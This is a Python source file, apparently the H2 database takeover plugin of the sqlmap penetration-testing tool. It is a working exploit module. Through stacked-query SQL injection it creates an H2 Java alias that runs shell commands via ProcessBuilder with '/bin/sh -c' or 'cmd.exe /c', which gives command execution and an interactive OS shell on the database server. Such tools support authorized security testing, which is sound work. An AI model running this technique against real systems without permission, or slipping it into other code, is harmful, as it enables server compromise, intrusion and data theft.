#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.enums import OS
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject
from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def osCmd(self):
        self._createExecAlias()
        self.runCmd(conf.osCmd)

    def osShell(self):
        self._createExecAlias()
        self.shell()

    def _createExecAlias(self):
        # NOTE: H2 compiles an inline Java source alias that shells out; the $$-delimited body avoids
        # single-quote escaping and survives stacked-query injection intact
        if not kb.get("h2ExecAlias"):
            kb.h2ExecAlias = randomStr(lowercase=True)
            argv = '"cmd.exe","/c"' if Backend.isOs(OS.WINDOWS) else '"/bin/sh","-c"'
            # NOTE: ProcessBuilder().start() is used instead of Runtime.exec() because 'exec' is an SQL
            # statement keyword that sqlmap's cleanQuery() would upper-case and break the case-sensitive Java
            source = 'String x(String c) throws Exception { return new String(new ProcessBuilder(new String[]{%s,c}).start().getInputStream().readAllBytes()); }' % argv
            inject.goStacked("CREATE ALIAS IF NOT EXISTS %s AS $$ %s $$" % (kb.h2ExecAlias, source))

    def h2ExecCmd(self, cmd, silent=False):
        self._createExecAlias()
        inject.goStacked("CALL %s('%s')" % (kb.h2ExecAlias, cmd.replace("'", "''")))

    def h2EvalCmd(self, cmd, first=None, last=None):
        self._createExecAlias()
        return inject.getValue("%s('%s')" % (kb.h2ExecAlias, cmd.replace("'", "''")), safeCharEncode=False)

    def osPwn(self):
        errMsg = "on H2 it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def osSmb(self):
        errMsg = "on H2 it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise SqlmapUnsupportedFeatureException(errMsg)
